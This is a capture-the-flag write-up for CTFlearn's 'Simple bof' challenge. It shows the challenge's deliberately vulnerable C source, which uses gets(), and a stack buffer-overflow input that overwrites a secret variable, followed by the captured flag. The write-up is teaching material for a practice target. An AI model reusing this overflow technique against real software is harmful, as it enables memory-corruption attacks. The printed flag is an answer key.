# [Simple bof](https://ctflearn.com/challenge/1010) (10)
Let's skip the video for now and connect to the `netcat` server: <br />
```
$ nc thekidofarcrania.com 35235

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xffee15a8 | 00 00 00 00 00 00 00 00 |
0xffee15b0 | 00 00 00 00 00 00 00 00 |
0xffee15b8 | 00 00 00 00 00 00 00 00 |
0xffee15c0 | 00 00 00 00 00 00 00 00 |
0xffee15c8 | ff ff ff ff ff ff ff ff |
0xffee15d0 | ff ff ff ff ff ff ff ff |
0xffee15d8 | ef be ad de 00 ff ff ff |
0xffee15e0 | c0 75 ed f7 84 9f 64 56 |
0xffee15e8 | f8 15 ee ff 11 7b 64 56 |
0xffee15f0 | 10 16 ee ff 00 00 00 00 |

Input some text: 

```
We are looking at some addresses in memory alongside their contents. <br />
Each row contains 8 bytes of hexadecimal data, with the leftmost column denoting the starting address for the leftmost byte. <br />

Let's try inputing a large string of `A`s (41) in hex: <br />
```
Input some text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xff9b1d58 | 41 41 41 41 41 41 41 41 |
0xff9b1d60 | 41 41 41 41 41 41 41 41 |
0xff9b1d68 | 41 41 41 41 41 41 41 41 |
0xff9b1d70 | 41 41 41 41 41 41 41 41 |
0xff9b1d78 | 41 41 41 41 41 41 41 41 |
0xff9b1d80 | 41 41 41 41 41 41 41 41 |
0xff9b1d88 | 41 41 00 de 00 ff ff ff |
0xff9b1d90 | c0 45 f1 f7 84 2f 60 56 |
0xff9b1d98 | a8 1d 9b ff 11 0b 60 56 |
0xff9b1da0 | c0 1d 9b ff 00 00 00 00 |

Wow you overflowed the secret value! Now try controlling the value of it!
```
We caused a buffer overflow which partially overwrote the `0xdeadbeef` value in memory. <br />
We know we have to change the value of this location to something specific, let's look at the C [file](https://ctflearn.com/challenge/download/1010) from the challenge text: <br />

```
$ bat bof.c

───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: bof.c
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ #include <string.h>
   4   │ #include <unistd.h>
   5   │ 
   6   │ // Defined in a separate source file for simplicity.
   7   │ void init_visualize(char* buff);
   8   │ void visualize(char* buff);
   9   │ void safeguard();
  10   │ 
  11   │ void print_flag();
  12   │ 
  13   │ void vuln() {
  14   │   char padding[16];
  15   │   char buff[32];
  16   │   int notsecret = 0xffffff00;
  17   │   int secret = 0xdeadbeef;
  18   │ 
  19   │   memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  20   │   memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.
  21   │ 
  22   │   // Initializes the stack visualization. Don't worry about it!
  23   │   init_visualize(buff); 
  24   │ 
  25   │   // Prints out the stack before modification
  26   │   visualize(buff);
  27   │ 
  28   │   printf("Input some text: ");
  29   │   gets(buff); // This is a vulnerable call!
  30   │ 
  31   │   // Prints out the stack after modification
  32   │   visualize(buff); 
  33   │ 
  34   │   // Check if secret has changed.
  35   │   if (secret == 0x67616c66) {
  36   │     puts("You did it! Congratuations!");
  37   │     print_flag(); // Print out the flag. You deserve it.
  38   │     return;
  39   │   } else if (notsecret != 0xffffff00) {
  40   │     puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
  41   │   } else if (secret != 0xdeadbeef) {
  42   │     puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  43   │   } else {
  44   │     puts("Maybe you haven't overflowed enough characters? Try again?");
  45   │   }
  46   │ 
  47   │   exit(0);
  48   │ }
  49   │ 
  50   │ int main() {
  51   │   setbuf(stdout, NULL);
  52   │   setbuf(stdin, NULL);
  53   │   safeguard();
  54   │   vuln();
  55   │ }
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

From the source code, we know that we shouldn't overflow the `notsecret` section in memory, but need to change `0xdeadbeef` to `0x67616c66`. <br />
We can use `rax2` to determine the binary representation of `0x67, 0x61, 0x6c, 0x66`: <br />
```
$ rax2 -s 0x67616c66
galf
```

Let's overwrite the `0xdeadbeef` with `0x67616c66`: <br />
```
Input some text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xffc92808 | 41 41 41 41 41 41 41 41 |
0xffc92810 | 41 41 41 41 41 41 41 41 |
0xffc92818 | 41 41 41 41 41 41 41 41 |
0xffc92820 | 41 41 41 41 41 41 41 41 |
0xffc92828 | 41 41 41 41 41 41 41 41 |
0xffc92830 | 41 41 41 41 41 41 41 41 |
0xffc92838 | 66 6c 61 67 00 ff ff ff |
0xffc92840 | c0 65 f7 f7 84 5f 56 56 |
0xffc92848 | 58 28 c9 ff 11 3b 56 56 |
0xffc92850 | 70 28 c9 ff 00 00 00 00 |

You did it! Congratuations!
CTFlearn{buffer_0verflows_4re_c00l!}
```

Now we have our flag: `CTFlearn{buffer_0verflows_4re_c00l!}` <br />

Notes:
*Apparently the stack doesn't HAVE to grow downwards, like I believed:* [stackoverflow](https://stackoverflow.com/questions/1677415/does-stack-grow-upward-or-downward). <br />

*There is a null terminator at the end of our input text, that's why* `0x00` *will always be at the end of our buffer overflow*. <br />

*Variables are stored in memory left-to-right, thats why `0xdeadbeef` is `ef be ad de` in memory.* <br />
